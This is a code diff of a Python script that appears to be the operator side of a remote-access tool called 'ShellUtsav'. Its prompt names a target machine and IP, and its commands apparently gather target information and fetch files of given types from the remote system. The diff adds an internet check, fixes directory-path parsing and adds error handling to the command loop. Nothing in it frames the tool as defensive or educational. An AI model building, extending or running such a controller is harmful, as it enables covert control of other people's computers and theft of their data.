@@ -5,7 +5,7 @@ import numpy as np
 import requests
 from colorama import Fore,init
 import os
-
+import socket
 
 MY_FAV_ROOT=f'C:\\Users\\{os.getlogin()}\Desktop'
 MY_FAV_FOLDER='ShellUtsav'
@@ -27,6 +27,15 @@ IP=""
 PUBLIC_IP=""
 PREV_COMMAND=""
 SHELL_RESULT=False
+
+hostname = socket.gethostname()
+IPAddr = socket.gethostbyname(hostname)
+
+def has_active_internet():
+    if IPAddr=="127.0.0.1":
+        return False
+    else:
+        return True
 
 def targetInfo():
     global PUBLIC_IP
@@ -80,15 +89,17 @@ def operation():
     leng=len(CWD)-1
     arr=[]
     while leng>=1:
+       arr.append(leng)
        if CWD[leng]=='\\':
             break
-       arr.append(leng)
        leng=leng-1 
     strr=""
     arr=sorted(arr)    
     for i in arr:
         strr=strr+CWD[i]
     CWD=CWD.replace(strr,"")
+    if CWD in ['C:','D:','E:','F:','G:','H:']:
+        CWD=CWD+'\\'
 
 def clearCollection():
     global TARGET
@@ -205,6 +216,8 @@ def ActionUploader():
         targetInfo()
     elif a[0]=='refreshserver' and len(a)==1:
         clearCollection()
+        CWD=""
+        PREV_COMMAND=""
 
     elif a[0]=='getalltypefiles' and len(a)==2:
         target_element=a[1]
@@ -331,17 +344,25 @@ def shell():
     global TARGET,IP
     getTargetMachine()
     while True:
+        internet=has_active_internet()
         struct0=(Fore.LIGHTYELLOW_EX+CWD)
         struct1=(Fore.LIGHTGREEN_EX+f"(target@{TARGET})-->IP: {IP}-[{struct0}]\n")
         struct2=(Fore.CYAN+"$ ")
         shell_struct=struct1+struct2
         command=str(input(shell_struct))
-        PREV_COMMAND=(command)
-        is_directory_change_command()
-        ActionUploader()
-        if command in ['exit','e','quit','q']:
-            clearCollection()
-            break
+        if internet:
+            try:
+                PREV_COMMAND=(command)
+                is_directory_change_command()
+                ActionUploader()
+                if command in ['exit','e','quit','q']:
+                    clearCollection()
+                    break
+            except Exception as e:
+                print(e)
+        else:
+            print(">>> ")
+            print("You are Offline!!!...")
 
 
 
